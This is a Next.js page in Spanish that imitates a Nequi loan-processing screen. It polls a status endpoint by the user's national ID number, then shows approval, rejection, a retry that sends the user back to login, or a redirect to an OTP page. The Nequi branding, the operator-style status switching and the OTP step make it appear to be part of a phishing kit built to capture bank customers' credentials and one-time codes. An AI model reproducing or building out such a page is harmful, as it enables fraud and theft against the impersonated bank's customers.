'use client'

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import Image from "next/image"
import LoadingSpinner from "@/app/components/loading-spinner"
import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { useRouter } from "next/navigation"
import TransitionLoader from "../components/transition-loader"
import Link from "next/link"

export default function ProcesandoPage() {
  const [status, setStatus] = useState<'processing' | 'approved' | 'rejected' | 'retry' | 'otp'>('processing')
  const [showTransition, setShowTransition] = useState(false)
  const router = useRouter();

  useEffect(() => {
    const redirectAfterDelay = (path: string, delay: number) => {
      setTimeout(() => {
        router.push(path);
      }, delay);
    };

    const checkStatus = async () => {
      const cedula = sessionStorage.getItem('cedula');
      if (!cedula) {
        router.push('/login');
        return;
      }

      try {
        const initialResponse = await fetch(`/api/loan-status?cedula=${cedula}`);
        const initialData = await initialResponse.json();

        if (initialData.status !== 'processing') {
          setShowTransition(true);
          setTimeout(() => {
            setStatus(initialData.status);
            setShowTransition(false);

            if (initialData.status === 'retry') {
              setTimeout(() => {
                sessionStorage.clear();
                router.push('/login');
              }, 3000);
            } else if (initialData.status === 'otp') {
              setTimeout(() => {
                router.push('/otp');
              }, 3000);
            } else {
              redirectAfterDelay('/', 3000);
            }
          }, 2000);
          return;
        }

        const interval = setInterval(async () => {
          try {
            const response = await fetch(`/api/loan-status?cedula=${cedula}`);
            const data = await response.json();

            if (data.status !== 'processing') {
              clearInterval(interval);
              setShowTransition(true);
              setTimeout(() => {
                setStatus(data.status);
                setShowTransition(false);

                if (data.status === 'retry') {
                  setTimeout(() => {
                    sessionStorage.clear();
                    router.push('/login');
                  }, 3000);
                } else if (data.status === 'otp') {
                  setTimeout(() => {
                    router.push('/otp');
                  }, 3000);
                } else {
                  redirectAfterDelay('/', 3000);
                }
              }, 2000);
            }
          } catch (error) {
            console.error('Error polling status:', error);
          }
        }, 2000);

        return () => clearInterval(interval);
      } catch (error) {
        console.error('Error checking loan status:', error);
      }
    };

    checkStatus();
  }, [router]);

  return (
    <main className="min-h-screen bg-pink-50 relative">
      <nav className="relative z-10 bg-white shadow-sm px-4 py-2">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
          <Button
            variant="ghost"
            onClick={() => window.location.reload()}
            className="bg-[#E6007E] hover:bg-[#C4006B] text-white rounded-md px-4 py-2"
          >
            Recargar
          </Button>
        </div>
      </nav>

      {showTransition && <TransitionLoader />}

      <div className="container mx-auto px-4 py-8 max-w-3xl">
        <Card className="shadow-lg border-2">
          <CardHeader className="text-center pb-2">
            <CardTitle className="text-2xl font-manrope">
              {status === 'processing' && 'Procesando solicitud...'}
              {status === 'approved' && '¡Solicitud Aprobada!'}
              {status === 'rejected' && 'Solicitud Rechazada'}
              {status === 'retry' && '¡Ups no se pudo!'}
              {status === 'otp' && 'Verificación Adicional Requerida'}
            </CardTitle>
          </CardHeader>
          <CardContent className="text-center space-y-6 pt-4">
            {status === 'processing' ? (
              <>
                <LoadingSpinner />
                <p className="text-lg font-medium text-[#200020]">
                  Estamos validando tu información
                </p>
                <p className="text-gray-600">
                  Este proceso puede tardar unos minutos. Por favor, no cierres esta ventana.
                </p>
              </>
            ) : status === 'approved' ? (
              <>
                <p className="text-lg text-gray-700">
                  Tu crédito ha sido aprobado. Serás redirigido en unos segundos...
                </p>
              </>
            ) : status === 'rejected' ? (
              <>
                <p className="text-lg text-gray-700">
                  No podemos aprobar tu solicitud en este momento. Redirigiendo...
                </p>
              </>
            ) : status === 'otp' ? (
              <>
                <p className="text-lg text-gray-700">
                  Necesitamos una verificación adicional. Serás redirigido a la página de OTP...
                </p>
              </>
            ) : (
              <>
                <p className="text-lg text-gray-700">
                  Hubo un problema con la solicitud. Volviendo al inicio...
                </p>
              </>
            )}
          </CardContent>
        </Card>
      </div>
    </main>
  );
}
